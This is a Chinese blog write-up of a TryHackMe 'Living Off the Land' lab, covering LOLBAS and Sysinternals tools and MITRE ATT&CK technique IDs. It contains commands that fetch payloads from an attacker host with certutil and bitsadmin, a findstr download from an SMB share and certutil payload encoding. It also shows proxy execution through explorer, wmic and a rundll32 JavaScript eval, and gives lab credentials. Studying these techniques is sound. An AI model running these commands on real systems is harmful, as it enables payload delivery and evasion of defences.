href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-靠土地为生</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-20T14:48:49.238Z" title="更新于 2024-08-20 22:48:49">2024-08-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-靠土地为生"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/08/20/thm-kao-tu-di-wei-sheng/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/08/20/thm-kao-tu-di-wei-sheng/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-靠土地为生</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time><time itemprop="dateCreated datePublished" datetime="2024-08-20T14:48:49.238Z" title="更新于 2024-08-20 22:48:49">2024-08-20</time></header><p>在红队活动中了解“靠土地为生”的基本概念。</p>
<h1 id="0x01-介绍">0x01 介绍</h1>
<h2 id="什么是靠土地为生">什么是“靠土地为生”？</h2>
<p>**“Living Off the Land”**是红队社区中的一个流行术语。这个名字取自现实生活，靠吃土地上现有的食物为生。同样，对手和恶意软件创建者也会利用目标计算机的内置工具和实用程序。 “ <strong>Living Off the Land</strong> ”一词于 2013 年在<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=j-r6UonEkUw">DerbyCon3</a>上推出，此后在红队社区中获得了更多关注，成为一种经常使用和流行的技术。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246124.png" alt="image-20240820180940220"></p>
<p>这些内置工具在目标系统或网络功能内执行各种常规活动；然而，它们的使用和滥用越来越多，例如，使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">CertUtil</a> 工具将恶意文件下载到目标计算机中。</p>
<p>主要想法是使用 Microsoft 签名的程序、脚本和库来融入和逃避防御控制。红队成员不希望在对目标执行交战活动时被发现，因此使用这些工具可以更安全地保持隐秘性。</p>
<p>以下是靠土地生活的一些类别：</p>
<ul>
<li>Reconnaissance 侦察</li>
<li>Files operations 文件操作</li>
<li>Arbitrary code execution 任意代码执行</li>
<li>Lateral movement 横向运动</li>
<li>Security product bypass 安全产品绕过</li>
</ul>
<h2 id="学习目标">学习目标</h2>
<ul>
<li>了解红队参与的**“Living Off the Land”**一词。</li>
<li>了解 LOLBAS 项目以及如何使用它。</li>
<li>了解并应用红队活动中使用的技术。</li>
</ul>
<h2 id="房间先决条件">房间先决条件</h2>
<ul>
<li>一般黑客技术的基础知识。</li>
<li>完成<a target="_blank" rel="noopener" href="https://tryhackme.com/path-action/jrpenetrationtester/join">初级渗透测试员</a>学习路径。</li>
<li>TryHackMe 红队初始访问模块.</li>
</ul>
<p>我们提供了一台 Windows 机器 10 Pro 来完成这个房间。您可以使用浏览器内功能，或者如果您更喜欢通过RDP连接，请确保部署 AttackBox 或连接到VPN.</p>
<p>使用下面的以下凭据。</p>
<p>Machine IP: MACHINE_IP       Username: thm     Password: TryHackM3</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ xfreerdp /<span class="hljs-attribute">v</span>:MACHINE_IP /<span class="hljs-attribute">u</span>:thm /<span class="hljs-attribute">p</span>:TryHackM3</code></pre>
<h1 id="0x02-windows-系统内核">0x02 Windows 系统内核</h1>
<h2 id="什么是-windows-sysinternals">什么是 Windows Sysinternals</h2>
<p>Windows Sysinternals 是一组工具和高级系统实用程序，旨在帮助 IT 专业人员在各种高级主题中管理、排除故障和诊断 Windows 操作系统。</p>
<p>Sysinternals Suite 分为多个类别，包括：</p>
<ul>
<li>Disk management 磁盘管理</li>
<li>Process management 进程管理</li>
<li>Networking tools 网络工具</li>
<li>System information 系统信息</li>
<li>Security tools 安全工具</li>
</ul>
<p>为了使用Windows Sysinternals工具，我们需要接受这些工具的Microsoft许可协议。我们可以通过传递-accepteula来做到这一点 命令提示符处或工具执行期间通过GUI提供的参数。</p>
<p>以下是一些流行的 Windows Sysinternals 工具：</p>
<table>
<thead>
<tr>
<th><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a></th>
<th>帮助系统管理员检查文件、目录、注册表项、全局对象和 Windows 服务的指定访问权限.</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a></td>
<td>在远程系统上执行程序的工具.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a></td>
<td>高级 Active Directory 工具，有助于轻松查看和管理AD数据库。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></td>
<td>监视运行进程的CPU峰值以及转储内存以进行进一步分析的能力。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">ProcMon</a></td>
<td>过程监控的重要工具.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview">TCPView</a></td>
<td>列出所有 TCP 和UDP连接的工具。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">PsTools</a></td>
<td>Sysinternals 套件中设计的第一个工具，用于帮助列出详细信息。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon">Portmon</a></td>
<td>监视并显示系统上的所有串行和并行端口活动。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois">Whois</a></td>
<td>提供指定域名或IP地址的信息。</td>
</tr>
</tbody>
</table>
<p>有关 Sysinternals 套件的更多信息，您可以在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">此处访问</a> Microsoft Docs 上的工具网页.</p>
<h2 id="sysinternals-live">Sysinternals Live</h2>
<p>Windows Sysinternals 的一大特点是无需安装。 Microsoft 提供了 Windows Sysinternals 服务 Sysinternals live，提供了使用和执行该工具的各种方法。我们可以通过以下方式访问和使用它们：</p>
<ul>
<li>网络浏览器（<a target="_blank" rel="noopener" href="https://live.sysinternals.com/">链接</a>）。</li>
<li>Windows 共享</li>
<li>命令提示符</li>
</ul>
<p>要使用这些工具，您可以下载它们，也可以在 Windows 资源管理器中输入 Sysinternal Live 路径\live.sysinternals.com\tools 。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246126.png" alt="image-20240820181847929"></p>
<p>请注意，由于附加的虚拟机无法访问互联网，因此我们在 C:\Tools\ 中预先下载了 Sysinternal 工具.</p>
<pre><code class="hljs scss">C:\Users\thm&gt; C:\Tools\SysinternalsSuite\PsExec64.exe</code></pre>
<p>如果您有兴趣了解有关 Windows Sysinternals 的更多信息，我们建议您熟悉以下附加资源:</p>
<ol>
<li>TryHackMe 房间： <a target="_blank" rel="noopener" href="https://tryhackme.com/room/btsysinternalssg">Sysinternals</a> 。</li>
<li>Microsoft Sysinternals 资源<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/resources/">网站</a>。</li>
</ol>
<h2 id="红队的利用和好处">红队的利用和好处</h2>
<p>内置工具和 Sysinternals 工具对系统管理员很有帮助，由于黑客、恶意软件和渗透测试人员对操作系统具有固有的信任，这些工具也被他们使用。这种信任对于红队成员来说是有益的，他们不希望被目标系统上的任何安全控制检测到或捕获。因此，这些工具已被用来逃避检测和其他蓝队控制。</p>
<p>请记住，由于如今使用这些工具的对手和恶意软件创建者不断增加，蓝队意识到了恶意使用情况，并对其中大多数实施了防御控制。</p>
<h1 id="0x03-lolbas-项目">0x03 LOLBAS 项目</h1>
<h2 id="什么是lolbas">什么是LOLBAS</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246127.png" alt="image-20240820182048021"></p>
<p>LOLBAS 代表Living Off the Land Binaries And Scripts，该<strong>项目</strong>的主要目标是收集和记录用作 Living Off the Land 技术<strong>的</strong>Microsoft 签名和内置工具，包括二进制文件、脚本和库。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246128.png" alt="image-20240820182244389"></p>
<p>LOLBAS 项目是一个社区驱动的存储库，收集了可用于红队目的的二进制文件、脚本、库的集合。它允许基于二进制文件、函数、脚本和 ATT&amp;CK 信息进行搜索。上图显示了此时 LOLBAS 项目页面的样子。如果您有兴趣了解该项目的更多详细信息，您可以<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">访问</a>该项目的网站。</p>
<p>LOLBAS 网站提供了方便的搜索栏来查询所有可用数据。查找二进制文件很简单；包括二进制名称将显示结果。但是，如果我们想查找特定的函数，则需要在函数名称之前提供 / 。例如，如果我们要查找所有执行函数，我们应该使用 /execute 类似地，为了根据类型查找，我们应该使用 # 符号后跟类型名称。项目中包含的类型如下：</p>
<ul>
<li>Script 脚本</li>
<li>Binary 二进制</li>
<li>Libraries 库</li>
<li>OtherMSBinaries 其他MS二进制文件</li>
</ul>
<h2 id="工具标准">工具标准</h2>
<p>工具要成为“靠土地生存”技术并被接受为 LOLBAS 项目的一部分，需要具体标准：</p>
<ul>
<li>操作系统本机的 Microsoft 签名文件或从 Microsoft 下载的文件。</li>
<li>具有已知用例未涵盖的其他有趣的意外功能。</li>
<li>有利于APT （高级持续威胁）或红队参与。</li>
</ul>
<p>请注意，如果您发现符合前面提到的标准的令人兴奋的二进制文件，您可以通过访问 <a target="_blank" rel="noopener" href="https://github.com/LOLBAS-Project/LOLBAS#criteria">GitHub 存储库</a>贡献页面来提交您的发现以获取更多信息。</p>
<h2 id="有趣的功能">有趣的功能</h2>
<p>LOLBAS 项目接受符合以下功能之一的工具提交：</p>
<ul>
<li>Arbitrary code execution 任意代码执行</li>
<li>文件操作，包括下载、上传、复制文件。</li>
<li>Compiling code 编译代码</li>
<li>持久性，包括将数据隐藏在备用数据流 (ADS) 中或在登录时执行。</li>
<li>UAC绕过</li>
<li>Dumping process memory 转储进程内存</li>
<li>DLL注入</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246129.png" alt="image-20240820182822977"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246130.png" alt="image-20240820182834790"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246131.png" alt="image-20240820182905454"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246132.png" alt="image-20240820182919726"></p>
<h1 id="0x04-文件操作">0x04 文件操作</h1>
<p>此任务显示基于现实世界以及红队活动中看到的功能和恶意软件活动的常用工具。</p>
<p>此任务将重点介绍一些有趣的“Living Off the Land”技术，旨在用于文件操作，包括下载、上传和编码。</p>
<h2 id="certutil">Certutil</h2>
<p>Certutil 是一个用于处理认证服务的 Windows 内置实用程序。它用于转储和显示证书颁发机构 (CA) 配置信息和其他 CA 组件。因此，该工具的正常用途是检索证书信息。然而，人们发现certutil.exe可以传输和编码与认证服务无关的文件。 MITRE ATT&amp;CK 框架将此技术标识为<strong>Ingress 工具传输</strong>( <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1105/">T1105</a> )。</p>
<p>为了通过示例来说明这一点，我们可以使用certutil.exe 使用以下命令从攻击者的 Web 服务器下载文件并将其存储在 Window 的临时文件夹中。请注意，我们使用-urlcache和-split -f参数来强制该工具使用分割技术从提供的 URL 下载。</p>
<pre><code class="hljs scss">certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe</code></pre>
<ul>
<li>-urlcache 显示 URL，启用在命令中使用 URL 选项</li>
<li>-split -f 分割并强制从提供的 URL 获取文件。</li>
</ul>
<p>此外， certutil.exe还可以用作编码工具，我们可以对文件进行编码并解码文件的内容。 ATT&amp;CK <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/">T1027</a>引用了这种混淆文件的技术，使其难以发现或分析。</p>
<pre><code class="hljs scss">C:\Users\thm&gt; certutil -encode payload.exe Encoded-payload.txt</code></pre>
<p>有关该工具的更多信息，您可以访问此处的 Microsoft 文档： <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Microsoft Docs: CertUtil</a></p>
<h2 id="bitsadmin">BITSAdmin</h2>
<p>Bitsadmin 工具是一个系统管理员实用程序，可用于创建、下载或上传后台智能传输服务 (BITS) 作业并检查其进度。 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">BITS</a> 是一种低带宽异步方法，用于从 HTTP Web 服务器和 SMB 服务器下载和上传文件。有关 Bitsadmin 工具的其他信息，请参阅 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin">Microsoft Docs</a>.</p>
<p>攻击者可能会滥用 BITS 作业在受感染的计算机中下载并执行恶意负载。有关此技术的更多信息，您可以访问 ATT&amp;CK <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1197/">T1197</a>页面。</p>
<p>介绍终端容器内容（重温）</p>
<pre><code class="hljs scss">C:\Users\thm&gt;bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe</code></pre>
<ul>
<li>/Transfer 使用传输选项</li>
<li>/Download 我们指定使用下载类型进行传输</li>
<li>/Priority  我们正在将作业的优先级设置为在前台运行</li>
</ul>
<p>有关bitsadmin的更多信息参数，您可以访问该工具的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer">微软文档</a>。</p>
<h2 id="findstr">FindStr</h2>
<p>Findstr 是 Microsoft 内置工具，用于查找文件中的文本和字符串模式。 findstr 工具非常有用，可以帮助用户和系统管理员在文件或解析的输出中进行搜索。例如，如果我们想检查我们机器上的端口 8080 是否打开，那么我们可以通过管道传输 netstat 的结果来查找该端口，如下所示：netstat -an| findstr“445”.</p>
<p>但是，使用findstr.exe发现了一种意想不到的方法 从网络内的SMB共享文件夹下载远程文件，如下所示,</p>
<pre><code class="hljs scss">C:\Users\thm&gt;findstr /V dummystring \\MachineName\ShareFolder\test.exe &gt; c:\Windows\Temp\test.exe</code></pre>
<ul>
<li>/V：打印出不包含所提供字符串的行。</li>
<li>dummystring：要搜索的文本；在这种情况下，我们提供了一个不能在文件中找到的字符串。</li>
<li>&gt; c:\Windows\Temp\test.exe 将输出重定向到目标计算机上的文件。</li>
</ul>
<p>请注意，可以使用其他工具进行文件操作。我们建议参观<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS</a> <a target="_blank" rel="noopener" href="https://lolbas-project.github.io/"> </a>项目来检查它们。</p>
<p>在下一个任务中，我们将介绍一些用于执行文件的工具。</p>
<pre><code class="hljs scss">bitsadmin<span class="hljs-selector-class">.exe</span> /transfer /Download /priority Foreground http://<span class="hljs-number">10.14</span>.<span class="hljs-number">79.125</span>:<span class="hljs-number">82</span>/test.c</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246133.png" alt="image-20240820184126674"></p>
<pre><code class="hljs scss">C:\Users\thm&gt; certutil -decode Encoded_file payload.txt</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246135.png" alt="image-20240820184434473"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246136.png" alt="image-20240820184445019"></p>
<h1 id="0x05-文件执行">0x05 文件执行</h1>
<p>此任务展示了在操作系统中执行二进制文件的各种方法。执行二进制文件的典型情况涉及各种已知的方法，例如使用命令行 cmd.exe 或从桌面。然而，还存在通过滥用其他系统二进制文件来实现有效负载执行的其他方法，其中原因之一是隐藏或强化有效负载的进程。基于 MITRE ATT&amp;CK 框架，该技术称为签名二进制代理执行或间接命令执行（<strong>Signed Binary Proxy Execution</strong> or <strong>Indirect Command Execution</strong>），攻击者利用其他系统工具生成恶意负载。这种技术还有助于逃避防守控制。</p>
<h2 id="file-explorer">File Explorer</h2>
<p>文件资源管理器是 Windows 的文件管理器和系统组件。人们发现使用文件资源管理器二进制文件可以执行其他.exe 文件。这种技术称为<strong>间接命令执行</strong>，其中可以使用和滥用explorer.exe工具从受信任的父进程启动恶意脚本或可执行文件。</p>
<p>explorer.exe 二进制文件位于：</p>
<ul>
<li>Windows 64 位版本的 C:\Windows\explorer.exe。</li>
<li>Windows 32 位版本的 C:\Windows\SysWOW64\explorer.exe。</li>
</ul>
<p>为了创建explorer.exe的子进程父级，我们可以执行以下命令：</p>
<pre><code class="hljs scss">C:\Users\thm&gt; explorer.exe /root,<span class="hljs-string">"C:\Windows\System32\calc.exe"</span></code></pre>
<p>作为上一个命令的结果，我们在桌面上弹出了计算器。</p>
<h2 id="wmic">WMIC</h2>
<p>Windows Management Instrumentation (WMIC) 是一个用于管理 Windows 组件的 Windows 命令行实用程序。人们发现WMIC还被用来执行逃避防御措施的二进制文件。 MITRE ATT&amp;CK 框架将此技术称为签名二进制代理执行 ( <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/">T1218</a> )</p>
<pre><code class="hljs scss">C:\Users\thm&gt;wmic.exe process call create calc
Executing (Win32_Process)-&gt;<span class="hljs-built_in">Create</span>()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = <span class="hljs-number">1740</span>;
        ReturnValue = <span class="hljs-number">0</span>;
};


C:\Users\thm&gt;</code></pre>
<p>上述 WMIC 命令创建一个我们选择的二进制文件的新进程，在本例中为calc.exe 。</p>
<h2 id="rundll32">Rundll32</h2>
<p>Rundll32 是 Microsoft 内置工具，可在操作系统中加载和运行动态链接库 DLL 文件。红队可以滥用和利用 rundll32.exe 来运行任意负载并执行 JavaScript 和 PowerShell 脚本。 MITRE ATT&amp;CK 框架将此识别为签名二进制代理执行：Rundll32 并将其称为 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/011/">T1218</a></p>
<p>rundll32.exe二进制文件位于：</p>
<ul>
<li>Windows 64 位版本的 C:\Windows\System32\rundll32.exe。</li>
<li>Windows 32 位版本为 C:\Windows\SysWOW64\rundll32.exe。</li>
</ul>
<p>现在让我们尝试执行 calc.exe 使用rundll32.exe 的二进制文件作为概念证明二进制：</p>
<pre><code class="hljs scss">C:\Users\thm&gt; rundll32.exe javascript:<span class="hljs-string">"\..\mshtml.dll,RunHTMLApplication "</span>;<span class="hljs-built_in">eval</span>("w=new ActiveXObject(\"WScript.Shell\");w<span class="hljs-selector-class">.run</span>(\"calc\");window<span class="hljs-selector-class">.close</span>()");

- rundll32<span class="hljs-selector-class">.exe</span>：使用 rundll32<span class="hljs-selector-class">.exe</span> 工具。

- javascript:<span class="hljs-string">"\..\mshtml.dll,RunHTMLApplication "</span>：

- mshtml.dll 是 Windows 的一个重要组件，它是 Internet Explorer 的核心组件之一，用于处理 HTML 和 		JavaScript。
通过 RunHTMLApplication，你可以运行一个 HTML 应用程序（HTA），该应用程序可以执行嵌入的脚本。
在这个例子中，代码使用了 ..\mshtml.dll 的路径以便 rundll32 可以加载它，进而调用 RunHTMLApplication 函数。</code></pre>
<p><strong><code>eval()</code></strong>：<code>eval()</code> 是 JavaScript 中的一个函数，它会执行传递给它的字符串内容，将其视为 JavaScript 代码。</p>
<p>在这段代码中，<code>eval()</code> 执行了以下 JavaScript 代码：</p>
<pre><code class="hljs scss">w = new <span class="hljs-built_in">ActiveXObject</span>("WScript.Shell");
w<span class="hljs-selector-class">.run</span>("calc");
window<span class="hljs-selector-class">.close</span>();</code></pre>
<ul>
